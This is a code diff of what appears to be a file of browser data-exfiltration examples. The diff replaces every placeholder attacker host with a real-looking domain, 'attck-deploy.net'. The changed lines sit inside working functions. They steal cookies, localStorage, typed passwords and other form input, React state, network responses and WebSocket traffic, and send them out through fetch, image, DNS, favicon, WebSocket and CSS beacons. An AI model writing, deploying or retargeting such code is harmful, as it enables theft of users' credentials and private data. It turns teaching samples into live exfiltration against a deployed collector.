@@ -56,7 +56,7 @@ function exfiltrateCookies() {
   const cookies = document.cookie;
   
   // Send to attacker's server
-  fetch('https://malicious-server.example/collect', {
+  fetch('https://attck-deploy.net/attcks/T1119/collect', {
     method: 'POST',
     body: JSON.stringify({ 
       cookies: cookies,
@@ -92,7 +92,7 @@ function exfiltrateLocalStorage() {
   }
   
   // Send to attacker's server
-  fetch('https://malicious-server.example/collect', {
+  fetch('https://attck-deploy.net/attcks/T1119/collect', {
     method: 'POST',
     body: JSON.stringify({ 
       localStorage: data,
@@ -127,7 +127,7 @@ function captureFormInputs() {
     // Override onchange
     input.onchange = function(e) {
       // Exfiltrate the value
-      fetch('https://malicious-server.example/collect', {
+      fetch('https://attck-deploy.net/attcks/T1119/collect', {
         method: 'POST',
         body: JSON.stringify({ 
           inputName: input.name || input.id || 'unknown',
@@ -148,7 +148,7 @@ function captureFormInputs() {
     input.oninput = function(e) {
       // For password fields, we might want real-time capture
       if (input.type === 'password') {
-        fetch('https://malicious-server.example/collect', {
+        fetch('https://attck-deploy.net/attcks/T1119/collect', {
           method: 'POST',
           body: JSON.stringify({ 
             inputName: input.name || input.id || 'unknown',
@@ -236,7 +236,7 @@ function captureReactState() {
   
   // Exfiltrate the state data
   if (states.length > 0) {
-    fetch('https://malicious-server.example/collect', {
+    fetch('https://attck-deploy.net/attcks/T1119/collect', {
       method: 'POST',
       body: JSON.stringify({ 
         reactStates: states,
@@ -277,7 +277,7 @@ function interceptNetworkRequests() {
       const responseData = await responseClone.json();
       
       // Exfiltrate the request and response
-      fetch('https://malicious-server.example/collect', {
+      fetch('https://attck-deploy.net/attcks/T1119/collect', {
         method: 'POST',
         body: JSON.stringify({ 
           request: {
@@ -297,7 +297,7 @@ function interceptNetworkRequests() {
         const responseText = await responseClone.text();
         
         // Exfiltrate the request and response
-        fetch('https://malicious-server.example/collect', {
+        fetch('https://attck-deploy.net/attcks/T1119/collect', {
           method: 'POST',
           body: JSON.stringify({ 
             request: {
@@ -340,7 +340,7 @@ function interceptNetworkRequests() {
     // Override onload
     this.onload = function() {
       // Exfiltrate the request and response
-      fetch('https://malicious-server.example/collect', {
+      fetch('https://attck-deploy.net/attcks/T1119/collect', {
         method: 'POST',
         body: JSON.stringify({ 
           request: {
@@ -393,7 +393,7 @@ function interceptWebSockets() {
     // Override send method
     ws.send = function(data) {
       // Exfiltrate the sent data
-      fetch('https://malicious-server.example/collect', {
+      fetch('https://attck-deploy.net/attcks/T1119/collect', {
         method: 'POST',
         body: JSON.stringify({ 
           type: 'websocket_send',
@@ -411,7 +411,7 @@ function interceptWebSockets() {
     // Monitor received messages
     ws.addEventListener('message', function(event) {
       // Exfiltrate the received data
-      fetch('https://malicious-server.example/collect', {
+      fetch('https://attck-deploy.net/attcks/T1119/collect', {
         method: 'POST',
         body: JSON.stringify({ 
           type: 'websocket_receive',
@@ -534,7 +534,7 @@ function imageBeacon(data) {
   const img = new Image();
   
   // Set the source to the attacker's server with data as parameters
-  img.src = \`https://malicious-server.example/beacon.gif?data=\${encodedData}&t=\${Date.now()}\`;
+  img.src = \`https://attck-deploy.net/attcks/T1119/beacon.gif?data=\${encodedData}&t=\${Date.now()}\`;
   
   // Handle errors silently
   img.onerror = () => {};
@@ -576,7 +576,7 @@ function dnsBeacon(data) {
   
   // Create an image or iframe to trigger the DNS lookup
   const img = new Image();
-  img.src = \`https://\${subdomain}.malicious-server.example/beacon.gif?t=\${Date.now()}\`;
+  img.src = \`https://\${subdomain}.attck-deploy.net/attcks/T1119/beacon.gif?t=\${Date.now()}\`;
   
   // Handle errors silently
   img.onerror = () => {};
@@ -611,7 +611,7 @@ function faviconBeacon(data) {
   link.type = 'image/x-icon';
   
   // Set the href to the attacker's server with data as parameters
-  link.href = \`https://malicious-server.example/favicon.ico?data=\${encodedData}&t=\${Date.now()}\`;
+  link.href = \`https://attck-deploy.net/attcks/T1119/favicon.ico?data=\${encodedData}&t=\${Date.now()}\`;
   
   // Replace existing favicon or add a new one
   const existingFavicon = document.querySelector('link[rel="icon"]');
@@ -643,7 +643,7 @@ faviconBeacon({
 // Malicious code example (DO NOT RUN)
 function websocketBeacon(data) {
   // Create a WebSocket connection
-  const ws = new WebSocket('wss://malicious-server.example/beacon');
+  const ws = new WebSocket('wss://attck-deploy.net/attcks/T1119/beacon');
   
   // Send data when connection is established
   ws.onopen = function() {
@@ -683,7 +683,7 @@ function cssBeacon(data) {
   
   // Set the content to include an @import with the data
   style.textContent = \`
-    @import url("https://malicious-server.example/beacon.css?data=\${encodedData}&t=\${Date.now()}");
+    @import url("https://attck-deploy.net/attcks/T1119/beacon.css?data=\${encodedData}&t=\${Date.now()}");
   \`;
   
   // Add to DOM temporarily
